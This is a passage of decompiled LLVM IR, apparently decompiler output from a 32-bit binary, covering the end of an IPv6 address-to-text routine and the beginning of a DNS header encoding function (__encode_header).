  store i32 %v1_805742c, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_805742c, 8
  br i1 %exitcond, label %dec_label_pc_8057432, label %dec_label_pc_80573ff

dec_label_pc_8057432:                             ; preds = %dec_label_pc_805742c
  %v10_8057432 = icmp eq i32 %v0_805742713, -1
  br i1 %v10_8057432, label %dec_label_pc_8057444, label %dec_label_pc_8057437

dec_label_pc_8057437:                             ; preds = %dec_label_pc_8057432
  %v10_8057437 = icmp eq i32 %v0_805741c9, -1
  %v0_8057440.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8057437, label %dec_label_pc_8057440, label %dec_label_pc_805743c

dec_label_pc_805743c:                             ; preds = %dec_label_pc_8057437
  %v1_805743c = load i32, i32* @ebp, align 4
  %v7_805743e = icmp sgt i32 %v0_8057440.pre, %v1_805743c
  br i1 %v7_805743e, label %dec_label_pc_8057440, label %dec_label_pc_8057444.thread

dec_label_pc_8057444.thread:                      ; preds = %dec_label_pc_805743c
  br label %dec_label_pc_8057449

dec_label_pc_8057440:                             ; preds = %dec_label_pc_8057437, %dec_label_pc_805743c
  store i32 %v0_8057440.pre, i32* @ebp, align 4
  store i32 %v0_805742713, i32* @edi, align 4
  br label %dec_label_pc_8057444

dec_label_pc_8057444:                             ; preds = %dec_label_pc_8057432, %dec_label_pc_8057440
  %v0_8057444 = phi i32 [ %v0_805741c9, %dec_label_pc_8057432 ], [ %v0_805742713, %dec_label_pc_8057440 ]
  %v10_8057444 = icmp eq i32 %v0_8057444, -1
  br i1 %v10_8057444, label %dec_label_pc_8057451, label %dec_label_pc_8057444.dec_label_pc_8057449_crit_edge

dec_label_pc_8057444.dec_label_pc_8057449_crit_edge: ; preds = %dec_label_pc_8057444
  %v0_8057449.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8057449

dec_label_pc_8057449:                             ; preds = %dec_label_pc_8057444.dec_label_pc_8057449_crit_edge, %dec_label_pc_8057444.thread
  %v0_8057449 = phi i32 [ %v1_805743c, %dec_label_pc_8057444.thread ], [ %v0_8057449.pre, %dec_label_pc_8057444.dec_label_pc_8057449_crit_edge ]
  %v0_805744449 = phi i32 [ %v0_805741c9, %dec_label_pc_8057444.thread ], [ %v0_8057444, %dec_label_pc_8057444.dec_label_pc_8057449_crit_edge ]
  %v1_8057449 = add i32 %v0_8057449, -1
  %v6_8057449 = sub i32 0, %v0_8057449
  %v7_8057449 = and i32 %v0_8057449, %v6_8057449
  %v8_8057449 = icmp slt i32 %v7_8057449, 0
  %v9_8057449 = icmp eq i32 %v1_8057449, 0
  %v10_8057449 = icmp slt i32 %v1_8057449, 0
  %v3_805744c = icmp eq i1 %v10_8057449, %v8_8057449
  %v4_805744c = icmp eq i1 %v9_8057449, false
  %v5_805744c = and i1 %v4_805744c, %v3_805744c
  br i1 %v5_805744c, label %dec_label_pc_8057451, label %dec_label_pc_805744e

dec_label_pc_805744e:                             ; preds = %dec_label_pc_8057449
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8057451

dec_label_pc_8057451:                             ; preds = %dec_label_pc_8057449, %dec_label_pc_8057444, %dec_label_pc_805744e
  %v0_80574f118 = phi i32 [ %v0_805744449, %dec_label_pc_8057449 ], [ -1, %dec_label_pc_8057444 ], [ -1, %dec_label_pc_805744e ]
  %v2_8057451 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8057451, i32* @ebx, align 4
  %v3_80574d3 = add i32 %v4_80573b3, 64
  %v12_8057491 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_80574f161 = icmp eq i32 %v0_80574f118, -1
  %v1_8057499 = icmp eq i1 %v12_8057491, false
  br label %dec_label_pc_805745c

dec_label_pc_805745c:                             ; preds = %dec_label_pc_8057451, %dec_label_pc_80574e7
  %v10_80574f167 = phi i1 [ %v10_80574f161, %dec_label_pc_8057451 ], [ %v10_80574f1, %dec_label_pc_80574e7 ]
  %v0_805747666 = phi i32 [ 0, %dec_label_pc_8057451 ], [ %v1_80574e7, %dec_label_pc_80574e7 ]
  %v1_805746c65 = phi i32 [ %v0_80574f118, %dec_label_pc_8057451 ], [ %v0_80574f1.pre, %dec_label_pc_80574e7 ]
  %v0_805747a64 = phi i32 [ %v2_8057451, %dec_label_pc_8057451 ], [ %v0_805747019, %dec_label_pc_80574e7 ]
  %stack_var_-120.163 = phi i8* [ null, %dec_label_pc_8057451 ], [ %stack_var_-120.0, %dec_label_pc_80574e7 ]
  %stack_var_-116.162 = phi i32 [ 32, %dec_label_pc_8057451 ], [ %stack_var_-116.0, %dec_label_pc_80574e7 ]
  br i1 %v10_80574f167, label %dec_label_pc_8057476, label %dec_label_pc_8057461

dec_label_pc_8057461:                             ; preds = %dec_label_pc_805745c
  %v12_8057461 = icmp eq i32 %v0_805747666, %v1_805746c65
  %v5_8057463 = icmp slt i32 %v0_805747666, %v1_805746c65
  br i1 %v5_8057463, label %dec_label_pc_8057476, label %dec_label_pc_8057465

dec_label_pc_8057465:                             ; preds = %dec_label_pc_8057461
  %v1_8057465 = load i32, i32* @ebp, align 4
  %v2_8057465 = add i32 %v1_8057465, %v1_805746c65
  store i32 %v2_8057465, i32* %eax.global-to-local, align 4
  %v5_805746a = icmp slt i32 %v0_805747666, %v2_8057465
  br i1 %v5_805746a, label %dec_label_pc_805746c, label %dec_label_pc_8057476

dec_label_pc_805746c:                             ; preds = %dec_label_pc_8057465
  %v1_805746e = icmp eq i1 %v12_8057461, false
  br i1 %v1_805746e, label %dec_label_pc_80574e7, label %dec_label_pc_8057470

dec_label_pc_8057470:                             ; preds = %dec_label_pc_805746c
  %v1_8057470 = inttoptr i32 %v0_805747a64 to i8*
  store i8 58, i8* %v1_8057470, align 1
  %v0_8057473 = load i32, i32* @ebx, align 4
  %v1_8057473 = add i32 %v0_8057473, 1
  store i32 %v1_8057473, i32* @ebx, align 4
  br label %dec_label_pc_80574e7

dec_label_pc_8057476:                             ; preds = %dec_label_pc_8057465, %dec_label_pc_8057461, %dec_label_pc_805745c
  %v1_8057476 = icmp eq i32 %v0_805747666, 0
  br i1 %v1_8057476, label %dec_label_pc_805747e.thread, label %dec_label_pc_805747e

dec_label_pc_805747e.thread:                      ; preds = %dec_label_pc_8057476
  br label %dec_label_pc_80574d2

dec_label_pc_805747e:                             ; preds = %dec_label_pc_8057476
  %v1_805747a = inttoptr i32 %v0_805747a64 to i8*
  store i8 58, i8* %v1_805747a, align 1
  %v0_805747d = load i32, i32* @ebx, align 4
  %v1_805747d = add i32 %v0_805747d, 1
  store i32 %v1_805747d, i32* @ebx, align 4
  %v0_805747e.pre = load i32, i32* @esi, align 4
  %v9_805747e = icmp eq i32 %v0_805747e.pre, 6
  %v1_8057481 = icmp eq i1 %v9_805747e, false
  br i1 %v1_8057481, label %dec_label_pc_80574d2, label %dec_label_pc_8057483

dec_label_pc_8057483:                             ; preds = %dec_label_pc_805747e
  %v0_8057483 = load i32, i32* @edi, align 4
  %v1_8057483 = icmp eq i32 %v0_8057483, 0
  %v1_8057485 = icmp eq i1 %v1_8057483, false
  br i1 %v1_8057485, label %dec_label_pc_80574d2, label %dec_label_pc_8057487

dec_label_pc_8057487:                             ; preds = %dec_label_pc_8057483
  %v0_8057487 = load i32, i32* @ebp, align 4
  %v9_8057487 = icmp eq i32 %v0_8057487, 6
  br i1 %v9_8057487, label %dec_label_pc_805749b, label %dec_label_pc_805748c

dec_label_pc_805748c:                             ; preds = %dec_label_pc_8057487
  %v9_805748c = icmp eq i32 %v0_8057487, 5
  %v1_805748f = icmp eq i1 %v9_805748c, false
  br i1 %v1_805748f, label %dec_label_pc_80574d2, label %dec_label_pc_8057491

dec_label_pc_8057491:                             ; preds = %dec_label_pc_805748c
  br i1 %v1_8057499, label %dec_label_pc_80574d2, label %dec_label_pc_805749b

dec_label_pc_805749b:                             ; preds = %dec_label_pc_8057491, %dec_label_pc_8057487
  %v2_80574a1 = sub i32 %v1_805747d, %v2_8057451
  store i32 %v2_80574a1, i32* @esi, align 4
  %v2_80574ac = sub i32 46, %v2_80574a1
  store i32 %v2_80574ac, i32* @ecx, align 4
  %v1_80574ae = add i32 %arg2, 12
  store i32 %v1_80574ae, i32* @eax, align 4
  store i32 %v1_805747d, i32* @edx, align 4
  %v0_80574b3 = load i8*, i8** %stack_var_-124, align 4
  %v1_80574b3 = ptrtoint i8* %v0_80574b3 to i32
  %v3_80574b3 = ptrtoint i8* %stack_var_-120.163 to i32
  %v5_80574b3 = call i32 @inet_ntop4(i32 %v1_80574b3, i32 %v3_80574b3, i32 %stack_var_-116.162)
  store i32 %v5_80574b3, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80574ba = icmp eq i32 %v5_80574b3, 0
  br i1 %v1_80574ba, label %dec_label_pc_8057544, label %dec_label_pc_80574c2

dec_label_pc_80574c2:                             ; preds = %dec_label_pc_805749b
  %v0_80574c5 = load i32, i32* @ebx, align 4
  %v5_80574c5 = inttoptr i32 %v0_80574c5 to i8*
  store i8* %v5_80574c5, i8** %stack_var_-124, align 4
  %v3_80574c6 = call i32 @strlen(i8* %v5_80574c5)
  store i32 %v3_80574c6, i32* %eax.global-to-local, align 4
  %v0_80574ce = load i32, i32* @ebx, align 4
  %v3_80574ce = add i32 %v0_80574ce, %v3_80574c6
  store i32 %v3_80574ce, i32* @ebx, align 4
  %v0_80574f6.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80574f6

dec_label_pc_80574d2:                             ; preds = %dec_label_pc_805747e.thread, %dec_label_pc_8057491, %dec_label_pc_805748c, %dec_label_pc_8057483, %dec_label_pc_805747e
  %v1_80574d354 = phi i32 [ 0, %dec_label_pc_805747e.thread ], [ %v0_805747e.pre, %dec_label_pc_8057491 ], [ %v0_805747e.pre, %dec_label_pc_805748c ], [ %v0_805747e.pre, %dec_label_pc_8057483 ], [ %v0_805747e.pre, %dec_label_pc_805747e ]
  %v0_80574dc53 = phi i32 [ %v0_805747a64, %dec_label_pc_805747e.thread ], [ %v1_805747d, %dec_label_pc_8057491 ], [ %v1_805747d, %dec_label_pc_805748c ], [ %v1_805747d, %dec_label_pc_8057483 ], [ %v1_805747d, %dec_label_pc_805747e ]
  %v0_80574d2 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_80574d2, i32* %stack_var_-112, align 4
  %v2_80574d3 = mul i32 %v1_80574d354, 4
  %v4_80574d3 = add i32 %v3_80574d3, %v2_80574d3
  %v5_80574d3 = inttoptr i32 %v4_80574d3 to i32*
  %v6_80574d3 = load i32, i32* %v5_80574d3, align 4
  %v5_80574dc = inttoptr i32 %v0_80574dc53 to i8*
  store i8* %v5_80574dc, i8** %stack_var_-124, align 4
  %v4_80574dd = call i32 @sprintf(i32 %v0_80574dc53, i32 ptrtoint ([3 x i8]* @global_var_805e391.1034 to i32))
  store i32 %v4_80574dd, i32* %eax.global-to-local, align 4
  %v0_80574e5 = load i32, i32* @ebx, align 4
  %v2_80574e5 = add i32 %v0_80574e5, %v4_80574dd
  store i32 %v2_80574e5, i32* @ebx, align 4
  br label %dec_label_pc_80574e7

dec_label_pc_80574e7:                             ; preds = %dec_label_pc_805746c, %dec_label_pc_8057470, %dec_label_pc_80574d2
  %stack_var_-116.0 = phi i32 [ %v6_80574d3, %dec_label_pc_80574d2 ], [ %stack_var_-116.162, %dec_label_pc_805746c ], [ %stack_var_-116.162, %dec_label_pc_8057470 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805e391.1034, i32 0, i32 0), %dec_label_pc_80574d2 ], [ %stack_var_-120.163, %dec_label_pc_805746c ], [ %stack_var_-120.163, %dec_label_pc_8057470 ]
  %v0_805747019 = phi i32 [ %v2_80574e5, %dec_label_pc_80574d2 ], [ %v0_805747a64, %dec_label_pc_805746c ], [ %v1_8057473, %dec_label_pc_8057470 ]
  %v0_80574e7 = load i32, i32* @esi, align 4
  %v1_80574e7 = add i32 %v0_80574e7, 1
  %v0_80574f1.pre = load i32, i32* @edi, align 4
  store i32 %v1_80574e7, i32* @esi, align 4
  %v7_80574eb = icmp sgt i32 %v1_80574e7, 7
  %v10_80574f1 = icmp eq i32 %v0_80574f1.pre, -1
  br i1 %v7_80574eb, label %dec_label_pc_80574f1, label %dec_label_pc_805745c

dec_label_pc_80574f1:                             ; preds = %dec_label_pc_80574e7
  br i1 %v10_80574f1, label %dec_label_pc_8057502, label %dec_label_pc_80574f6

dec_label_pc_80574f6:                             ; preds = %dec_label_pc_80574f1, %dec_label_pc_80574c2
  %v0_80574fe = phi i32 [ %v0_805747019, %dec_label_pc_80574f1 ], [ %v3_80574ce, %dec_label_pc_80574c2 ]
  %v0_80574f6 = phi i32 [ %v0_80574f1.pre, %dec_label_pc_80574f1 ], [ %v0_80574f6.pre, %dec_label_pc_80574c2 ]
  %v1_80574f6 = load i32, i32* @ebp, align 4
  %v2_80574f6 = add i32 %v1_80574f6, %v0_80574f6
  store i32 %v2_80574f6, i32* %eax.global-to-local, align 4
  %v9_80574f9 = icmp eq i32 %v2_80574f6, 8
  %v1_80574fc = icmp eq i1 %v9_80574f9, false
  br i1 %v1_80574fc, label %dec_label_pc_8057502, label %dec_label_pc_80574fe

dec_label_pc_80574fe:                             ; preds = %dec_label_pc_80574f6
  %v1_80574fe = inttoptr i32 %v0_80574fe to i8*
  store i8 58, i8* %v1_80574fe, align 1
  %v0_8057501 = load i32, i32* @ebx, align 4
  %v1_8057501 = add i32 %v0_8057501, 1
  store i32 %v1_8057501, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057502

dec_label_pc_8057502:                             ; preds = %dec_label_pc_80574f6, %dec_label_pc_80574f1, %dec_label_pc_80574fe
  %v0_8057506 = phi i32 [ %v0_80574fe, %dec_label_pc_80574f6 ], [ %v0_805747019, %dec_label_pc_80574f1 ], [ %v1_8057501, %dec_label_pc_80574fe ]
  store i32 %v2_8057451, i32* %edx.global-to-local, align 4
  %v1_8057506 = add i32 %v0_8057506, 1
  store i32 %v1_8057506, i32* %eax.global-to-local, align 4
  %v1_8057509 = inttoptr i32 %v0_8057506 to i8*
  store i8 0, i8* %v1_8057509, align 1
  %v0_805750c = load i32, i32* %eax.global-to-local, align 4
  %v1_805750c = load i32, i32* %edx.global-to-local, align 4
  %v2_805750c = sub i32 %v0_805750c, %v1_805750c
  store i32 %v2_805750c, i32* @eax, align 4
  %tmp78 = icmp ugt i32 %v2_805750c, %arg4
  br i1 %tmp78, label %dec_label_pc_8057514, label %dec_label_pc_8057521

dec_label_pc_8057514:                             ; preds = %dec_label_pc_8057502
  %v0_8057514 = load i8*, i8** %stack_var_-124, align 4
  %v1_8057514 = ptrtoint i8* %v0_8057514 to i32
  %v2_8057514 = call i32 @__errno_location(i32 %v1_8057514)
  store i32 %v2_8057514, i32* %eax.global-to-local, align 4
  %v1_8057519 = inttoptr i32 %v2_8057514 to i32*
  store i32 28, i32* %v1_8057519, align 4
  br label %dec_label_pc_8057542

dec_label_pc_8057521:                             ; preds = %dec_label_pc_8057502
  %v0_8057521 = load i32, i32* @edi, align 4
  store i32 %v0_8057521, i32* %stack_var_-112, align 4
  %tmp45 = bitcast i8** %stack_var_12 to i32*
  %v3_80575242 = load i32, i32* %tmp45, align 4
  %tmp46 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_80575242, i32* %tmp46, align 4
  %v0_805752b.cast = inttoptr i32 %v3_80575242 to i8*
  %v5_805752b = call i32 @strcpy(i8* %v0_805752b.cast, i32 %v2_8057451)
  store i32 %v5_805752b, i32* %eax.global-to-local, align 4
  store i32 %v5_805752b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057544

dec_label_pc_8057537:                             ; preds = %dec_label_pc_8057390
  %v1_8057537 = call i32 @__errno_location(i32 %v0_8057383)
  store i32 %v1_8057537, i32* %eax.global-to-local, align 4
  %v1_805753c = inttoptr i32 %v1_8057537 to i32*
  store i32 97, i32* %v1_805753c, align 4
  br label %dec_label_pc_8057542

dec_label_pc_8057542:                             ; preds = %dec_label_pc_8057514, %dec_label_pc_8057537
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057544

dec_label_pc_8057544:                             ; preds = %dec_label_pc_805749b, %dec_label_pc_8057521, %dec_label_pc_805739b, %dec_label_pc_8057542
  %v0_8057547 = phi i32 [ 0, %dec_label_pc_805749b ], [ %v5_805752b, %dec_label_pc_8057521 ], [ %v3_80573a7, %dec_label_pc_805739b ], [ 0, %dec_label_pc_8057542 ]
  store i32 %v0_8057547, i32* %eax.global-to-local, align 4
  store i32 %v0_8057383, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8057547

; uselistorder directives
  uselistorder i32 %v0_8057547, { 1, 0 }
  uselistorder i32 %v0_8057506, { 1, 0 }
  uselistorder i32 %v1_80574e7, { 1, 0, 2 }
  uselistorder i32 %v0_80574dc53, { 1, 0 }
  uselistorder i32 %v0_805747e.pre, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_805747d, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %stack_var_-116.162, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.163, { 2, 1, 0 }
  uselistorder i32 %v0_805747a64, { 2, 3, 1, 0 }
  uselistorder i32 %v1_805746c65, { 2, 0, 1 }
  uselistorder i32 %v0_805747666, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8057451, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8057449, { 1, 0 }
  uselistorder i32 %v0_8057449, { 1, 2, 0 }
  uselistorder i32 %v1_805742c, { 0, 2, 1 }
  uselistorder i32 %v0_805741c9, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805742713, { 0, 2, 1, 3 }
  uselistorder i1 %v10_8057417, { 1, 0 }
  uselistorder i32 %v0_805744268, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805743769, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_805742c71, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_80573e772, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8057383, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 6, 4, 2, 5, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 13, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 97, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 (i32, i32)* @sprintf, { 4, 3, 2, 1, 0 }
  uselistorder [3 x i8]* @global_var_805e391.1034, { 1, 0 }
  uselistorder i8 58, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 64, { 7, 3, 0, 6, 8, 5, 2, 4, 1 }
  uselistorder i32* @esp, { 0, 1, 63, 64, 65, 66, 67, 68, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 16, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 12, 238, 239, 240, 13, 241, 10, 242, 243, 244, 245, 246, 247, 14, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 11, 261, 262, 263, 264, 265, 266, 15, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 2, 3, 334, 4, 5, 6, 17, 289, 290, 291, 292, 18, 293, 294, 295, 296, 297, 20, 298, 299, 300, 22, 301, 23, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 21, 314, 24, 315, 316, 317, 25, 318, 319, 320, 321, 322, 323, 324, 325, 19, 326, 94, 69, 70, 71, 72, 73, 74, 75, 76, 77, 80, 9, 78, 79, 81, 82, 83, 84, 26, 85, 86, 87, 88, 89, 90, 91, 92, 93, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 158, 7, 148, 149, 150, 151, 152, 27, 153, 154, 155, 156, 157, 159, 160, 161, 162, 174, 8, 163, 164, 165, 166, 167, 168, 28, 169, 170, 171, 172, 173, 175, 176, 177, 178, 29, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 30, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 216, 327, 328, 329, 330, 331, 332, 333 }
  uselistorder i32 15, { 1, 5, 12, 11, 2, 10, 3, 4, 6, 7, 8, 9, 0 }
  uselistorder i32 60, { 6, 7, 3, 8, 9, 4, 1, 2, 5, 0 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 1, 10, 11, 12, 16, 21, 19, 18, 20, 13, 2, 3, 4, 5, 6, 7, 8, 0, 9, 14, 15, 17 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8057544, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8057542, { 1, 0 }
  uselistorder label %dec_label_pc_8057502, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80574e7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80574d2, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_805745c, { 1, 0 }
  uselistorder label %dec_label_pc_8057451, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057444, { 1, 0 }
  uselistorder label %dec_label_pc_8057440, { 1, 0 }
  uselistorder label %dec_label_pc_805742c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8057429, { 1, 0 }
  uselistorder label %dec_label_pc_80573ff, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i8* @__decompiler_undefined_function_2()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8057551 = load i32, i32* @ebx, align 4
  store i32 %v0_8057551, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* %ebx.global-to-local, align 4
  %v4_8057559 = ptrtoint i8* %tmp8 to i32
  store i32 %v4_8057559, i32* %esi.global-to-local, align 4
  %v7_8057562 = icmp sgt i32 %tmp, 11
  br i1 %v7_8057562, label %dec_label_pc_8057568, label %dec_label_pc_80575fe

dec_label_pc_8057568:                             ; preds = %entry
  %v1_8057568 = add i32 %tmp9, 1
  %v2_8057568 = inttoptr i32 %v1_8057568 to i8*
  %v3_8057568 = load i8, i8* %v2_8057568, align 1
  store i8 %v3_8057568, i8* %tmp8, align 1
  %v0_805756e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805756e = inttoptr i32 %v0_805756e to i32*
  %v2_805756e = load i32, i32* %v1_805756e, align 4
  %v1_8057570 = trunc i32 %v2_805756e to i8
  %v2_8057570 = load i32, i32* %esi.global-to-local, align 4
  %v3_8057570 = add i32 %v2_8057570, 1
  %v4_8057570 = inttoptr i32 %v3_8057570 to i8*
  store i8 %v1_8057570, i8* %v4_8057570, align 1
  %v0_8057596 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057596 = add i32 %v0_8057596, 8
  %v2_8057596 = inttoptr i32 %v1_8057596 to i32*
  %v3_8057596 = load i32, i32* %v2_8057596, align 4
  %v1_8057599 = mul i32 %v3_8057596, 8
  %v2_805759f = or i32 %v1_8057599, 4
  %v1_80575a1 = add i32 %v0_8057596, 20
  %v2_80575a1 = inttoptr i32 %v1_80575a1 to i32*
  %v3_80575a1 = load i32, i32* %v2_80575a1, align 4
  %v4_80575a1 = icmp eq i32 %v3_80575a1, 0
  %v1_80575a5 = icmp eq i1 %v4_80575a1, false
  %v2_80575a5 = zext i1 %v1_80575a5 to i32
  %v2_80575a8 = or i32 %v2_80575a5, %v2_805759f
  %v2_80575aa = or i32 %v2_80575a8, -126
  %v5_80575aa = trunc i32 %v2_80575aa to i8
  store i32 %v2_80575aa, i32* @ecx, align 4
  %v2_80575ac = load i32, i32* %esi.global-to-local, align 4
  %v3_80575ac = add i32 %v2_80575ac, 2
  %v4_80575ac = inttoptr i32 %v3_80575ac to i8*
  store i8 %v5_80575aa, i8* %v4_80575ac, align 1
  %v0_80575af = load i32, i32* %ebx.global-to-local, align 4
  %v1_80575b5 = add i32 %v0_80575af, 28
  %v2_80575b5 = inttoptr i32 %v1_80575b5 to i8*
  %v3_80575b5 = load i8, i8* %v2_80575b5, align 1
  %tmp13 = urem i8 %v3_80575b5, 16
  %v2_80575c0 = or i8 %tmp13, -128
  %v2_80575c2 = load i32, i32* %esi.global-to-local, align 4
  %v3_80575c2 = add i32 %v2_80575c2, 3
  %v4_80575c2 = inttoptr i32 %v3_80575c2 to i8*
  store i8 %v2_80575c0, i8* %v4_80575c2, align 1
  %v0_80575c5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80575c5 = add i32 %v0_80575c5, 33
  %v2_80575c5 = inttoptr i32 %v1_80575c5 to i8*
  %v3_80575c5 = load i8, i8* %v2_80575c5, align 1
  %v2_80575c9 = load i32, i32* %esi.global-to-local, align 4
  %v3_80575c9 = add i32 %v2_80575c9, 4
  %v4_80575c9 = inttoptr i32 %v3_80575c9 to i8*
  store i8 %v3_80575c5, i8* %v4_80575c9, align 1
  %v0_80575cc = load i32, i32* %ebx.global-to-local, align 4
  %v1_80575cc = add i32 %v0_80575cc, 32
  %v2_80575cc = inttoptr i32 %v1_80575cc to i32*
  %v3_80575cc = load i32, i32* %v2_80575cc, align 4
  %v1_80575cf = trunc i32 %v3_80575cc to i8
  %v2_80575cf = load i32, i32* %esi.global-to-local, align 4
  %v3_80575cf = add i32 %v2_80575cf, 5
  %v4_80575cf = inttoptr i32 %v3_80575cf to i8*
  store i8 %v1_80575cf, i8* %v4_80575cf, align 1
  %v0_80575d2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80575d2 = add i32 %v0_80575d2, 37
  %v2_80575d2 = inttoptr i32 %v1_80575d2 to i8*
  %v3_80575d2 = load i8, i8* %v2_80575d2, align 1
  %v2_80575d6 = load i32, i32* %esi.global-to-local, align 4
  %v3_80575d6 = add i32 %v2_80575d6, 6
  %v4_80575d6 = inttoptr i32 %v3_80575d6 to i8*
  store i8 %v3_80575d2, i8* %v4_80575d6, align 1
  %v0_80575d9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80575d9 = add i32 %v0_80575d9, 36
  %v2_80575d9 = inttoptr i32 %v1_80575d9 to i32*
  %v3_80575d9 = load i32, i32* %v2_80575d9, align 4
  %v1_80575dc = trunc i32 %v3_80575d9 to i8
  %v2_80575dc = load i32, i32* %esi.global-to-local, align 4
  %v3_80575dc = add i32 %v2_80575dc, 7
  %v4_80575dc = inttoptr i32 %v3_80575dc to i8*
  store i8 %v1_80575dc, i8* %v4_80575dc, align 1
  %v0_80575df = load i32, i32* %ebx.global-to-local, align 4
  %v1_80575df = add i32 %v0_80575df, 41
  %v2_80575df = inttoptr i32 %v1_80575df to i8*
  %v3_80575df = load i8, i8* %v2_80575df, align 1
  %v2_80575e3 = load i32, i32* %esi.global-to-local, align 4
  %v3_80575e3 = add i32 %v2_80575e3, 8
  %v4_80575e3 = inttoptr i32 %v3_80575e3 to i8*
  store i8 %v3_80575df, i8* %v4_80575e3, align 1
  %v0_80575e6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80575e6 = add i32 %v0_80575e6, 40
  %v2_80575e6 = inttoptr i32 %v1_80575e6 to i32*
  %v3_80575e6 = load i32, i32* %v2_80575e6, align 4
  %v1_80575e9 = trunc i32 %v3_80575e6 to i8
  %v2_80575e9 = load i32, i32* %esi.global-to-local, align 4
  %v3_80575e9 = add i32 %v2_80575e9, 9
  %v4_80575e9 = inttoptr i32 %v3_80575e9 to i8*
  store i8 %v1_80575e9, i8* %v4_80575e9, align 1
  %v0_80575ec = load i32, i32* %ebx.global-to-local, align 4
  %v1_80575ec = add i32 %v0_80575ec, 45
  %v2_80575ec = inttoptr i32 %v1_80575ec to i8*
  %v3_80575ec = load i8, i8* %v2_80575ec, align 1
  %v2_80575f0 = load i32, i32* %esi.global-to-local, align 4
  %v3_80575f0 = add i32 %v2_80575f0, 10
  %v4_80575f0 = inttoptr i32 %v3_80575f0 to i8*
  store i8 %v3_80575ec, i8* %v4_80575f0, align 1
  %v0_80575f3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80575f3 = add i32 %v0_80575f3, 44
  %v2_80575f3 = inttoptr i32 %v1_80575f3 to i32*
  %v3_80575f3 = load i32, i32* %v2_80575f3, align 4
  %v1_80575f6 = trunc i32 %v3_80575f3 to i8
  %v2_80575f6 = load i32, i32* %esi.global-to-local, align 4
  %v3_80575f6 = add i32 %v2_80575f6, 11
  %v4_80575f6 = inttoptr i32 %v3_80575f6 to i8*
  store i8 %v1_80575f6, i8* %v4_80575f6, align 1
